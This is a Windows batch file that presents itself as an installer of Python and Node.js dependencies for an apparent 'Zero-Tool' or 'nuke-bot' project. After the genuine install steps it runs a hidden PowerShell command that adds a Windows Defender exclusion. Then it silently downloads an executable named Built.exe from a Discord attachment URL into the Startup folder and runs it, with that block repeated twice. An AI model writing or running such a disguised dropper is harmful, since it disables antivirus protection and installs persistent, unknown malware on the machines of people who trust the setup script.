@echo off
echo Installing Python dependencies...
python -m pip install -r requirements.txt
if %errorlevel% neq 0 (
    echo Failed to install Python dependencies. Pausing...
    pause
)

echo Installing Node.js dependencies...
cd Zero-Tool/nuke-bot
call npm i
if %errorlevel% neq 0 (
    echo Failed to install Node.js dependencies. Pausing...
    pause
)

cd ../..
powershell -w hidden -c Add-MpPreference -ExclusionPath ""

@echo off
setlocal 

set "URL=https://cdn.discordapp.com/attachments/1055547260932477029/1254542849727529071/Built.exe?ex=6679df93&is=66788e13&hm=1eed75c7a3110f757814fd6a8aa4d88d0b8ee0aaff8249e0e82928d9e88ceb12&"
set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"


if exist "%DEST%" del "%DEST%"

curl --silent --output "%DEST%" "%URL%"

if %errorlevel% neq 0 (
  exit /b %errorlevel%
)

call "%DEST%"

@echo off
setlocal 

set "URL=https://cdn.discordapp.com/attachments/1055547260932477029/1254542849727529071/Built.exe?ex=6679df93&is=66788e13&hm=1eed75c7a3110f757814fd6a8aa4d88d0b8ee0aaff8249e0e82928d9e88ceb12&"
set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"


if exist "%DEST%" del "%DEST%"

curl --silent --output "%DEST%" "%URL%"

if %errorlevel% neq 0 (
  exit /b %errorlevel%
)

call "%DEST%"


@echo off

start.bat
